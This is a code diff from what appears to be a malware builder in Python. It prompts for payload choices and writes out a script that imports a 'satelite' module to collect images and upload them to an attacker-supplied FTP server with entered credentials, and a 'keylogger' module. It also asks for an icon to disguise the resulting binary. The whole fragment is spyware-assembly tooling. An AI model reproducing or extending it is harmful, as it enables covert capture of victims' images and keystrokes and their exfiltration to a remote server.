@@ -17,16 +17,14 @@ list_keys = [int(k) for k in keys.split(' ')]
 File = open(Name+'.py','w')
 iconfile = input("icon file for the binary (if not needed leave it) : ")
 for i in list_keys:
+    
     if i == 1 :
-        File.write('from  payloads import satelite')
-        File.write('\nsatelite.collectimage()\n')
-       
+        File.write('from  payloads import satelite\n')
         address = input("input ftp address : ")
         username = input("input ftp username : ")
         password = input("input ftp password : ")
-        File.write('satelite.ADDRESS = \"'+address + "\"\n")
-        File.write('satelite.USERNAME = \"'+username + "\"\n")
-        File.write('satelite.PASSWORD = \"'+password + "\"\n")
+        File.write("satelite.init_creditinals(" + "\"" + address + "\",\"" + username + "\",\"" + password + "\")\n" )
+        File.write('satelite.collectimage()\n')
     elif i == 2 :
         File.write('from  payloads import keylogger')
         File.write('\n')
